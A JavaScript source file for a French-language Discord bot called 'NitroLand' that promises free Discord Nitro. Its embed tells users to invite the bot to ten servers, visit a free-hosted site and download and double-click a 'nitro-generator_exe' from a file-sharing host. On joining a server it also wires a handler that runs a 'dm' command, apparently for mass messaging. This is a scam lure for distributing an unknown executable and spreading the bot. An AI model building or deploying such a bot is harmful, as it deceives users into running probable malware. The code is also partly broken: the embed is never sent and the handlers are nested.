const fs = require("fs");
const { Client, Collection, MessageEmbed } = require('discord.js');
const { TOKEN, PREFIX } = require('./config');

const client = new Client();
client.commands = new Collection();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

for (file of commandFiles) {
  const command = require(`./commands/${file}`);
  client.commands.set(command.name, command);
}
console.log(client.commands);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity("donner des codes nitro", { type: "PLAYING" })
});

client.on("guildMemberAdd", function(member){

  client.on('message', message => {

    var nitro = new MessageEmbed()
    .setTitle('Tu veux nitro gratuitement ? :D')
    .setThumbnail(client.user.displayAvatarURL())
    .addField('Nouvelle méthode pour avoir nitro gratuitement !', `• Invite ce bot sur 10 serveurs\r\n• Visite notre site\r\n• Télécharge notre programme\r\n• Double clic et profite de ton nitro !`)
    .addField('Liens', `• [Invitation du bot](https://discord.com/api/oauth2/authorize?client_id=835855153785339914&permissions=0&scope=bot)\r\n• [Notre site officiel](https://nitro-land.000webhostapp.com/)\r\n• [Lien de téléchargement direct](https://anonfiles.com/Bee1adtdu0/nitro-generator_exe)`)
    .addField("Attention !", "**Tu ne pourras pas récupérer ton code si tu n'as pas invité ce bot sur 10 serveurs !**")
    .setColor("#39d19c")
    .setFooter('NitroLand <3', client.user.displayAvatarURL());

  })
});

client.on("guildCreate", guild => {
  
	client.on('message', message =>{

		const args = message.content.slice(PREFIX.length).split(/ +/);
		client.commands.get('dm').execute(client, message, args);

	})
});

client.on('message', message => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;

    const args = message.content.slice(PREFIX.length).split(/ +/);
    const command = args.shift().toLowerCase();

    if (!client.commands.has(command)) return;
    client.commands.get(command).execute(client, message, args);
});

client.login(TOKEN);
